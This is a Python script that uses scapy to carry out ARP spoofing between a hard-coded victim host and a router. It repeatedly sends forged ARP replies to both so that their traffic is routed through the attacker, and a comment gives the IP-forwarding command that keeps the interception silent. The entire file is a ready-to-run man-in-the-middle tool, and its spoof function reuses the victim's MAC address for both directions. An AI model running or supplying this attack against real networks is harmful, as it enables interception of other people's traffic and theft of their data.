#!/usr/bin/env python

#needs to enable ip forwarding packets with command:
#   echo 1 > /proc/sys/net/ipv4/ip_forward 

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


target_ip = "192.168.165.83"
target_mac = get_mac(target_ip)
router_ip = "192.168.165.226"
router_mac = get_mac(router_ip)


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)


while True:
    spoof(target_ip, router_ip)
    spoof(router_ip, target_ip)
    time.sleep(2)


